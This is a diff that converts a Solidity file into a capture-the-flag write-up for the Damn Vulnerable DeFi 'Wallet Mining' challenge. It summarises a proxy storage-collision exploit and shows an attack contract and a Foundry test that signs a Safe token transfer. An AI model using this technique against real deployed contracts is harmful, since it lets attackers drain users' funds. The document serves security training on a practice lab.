@@ -1,15 +1,12 @@
-// SPDX-License-Identifier: MIT
-// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
-pragma solidity =0.8.25;
+# 13. Wallet Mining
 
-import {AuthorizerUpgradeable} from "../AuthorizerUpgradeable.sol";
-import {WalletDeployer} from "../WalletDeployer.sol";
-import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
-import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
-import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
-import {DamnValuableToken} from "../../../src/DamnValuableToken.sol";
-import {Enum} from "@safe-global/safe-smart-account/contracts/common/Enum.sol";
+- This challenge featured a Transparent Proxy which had storage collision. We used this collision to initialise the implementation once again and give our attacking contract access.
+- We had to reverse-engineer an address for a deployed wallet. We had to find a correct nonce and initialisation parameters for the deployment in order to find the correct `salt` for the contract.
+- Finally we had to build a transaction to transfer the tokens to the user and sign it with the user’s private key.
 
+## Solution
+
+```solidity
 contract AttackWalletDeployer {
     address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
     uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
@@ -84,3 +81,40 @@ contract AttackWalletDeployer {
         revert("Lost params not found");
     }
 }
+
+// TEST
+
+    function test_walletMining() public checkSolvedByPlayer {
+        bytes32 DOMAIN_SEPARATOR = keccak256(
+            abi.encode(
+                bytes32(0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218), // Safe domain type hash
+                block.chainid, // Current chain ID
+                USER_DEPOSIT_ADDRESS // Safe contract address
+            )
+        );
+        bytes memory txHashData = abi.encodePacked(
+            bytes1(0x19), // EIP-191 prefix
+            bytes1(0x01), // EIP-712 version
+            DOMAIN_SEPARATOR,
+            keccak256(
+                abi.encode(
+                    bytes32(0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8), // Safe domain type hash
+                    address(token),
+                    0,
+                    keccak256(abi.encodeCall(token.transfer, (user, 20_000_000e18))),
+                    Enum.Operation.Call,
+                    50000,
+                    0,
+                    0,
+                    address(0),
+                    payable(0),
+                    0
+                )
+            )
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, keccak256(txHashData));
+        bytes memory signatures = abi.encodePacked(r, s, v);
+
+        new AttackWalletDeployer(address(authorizer), walletDeployer, user, ward, signatures);
+    }
+```
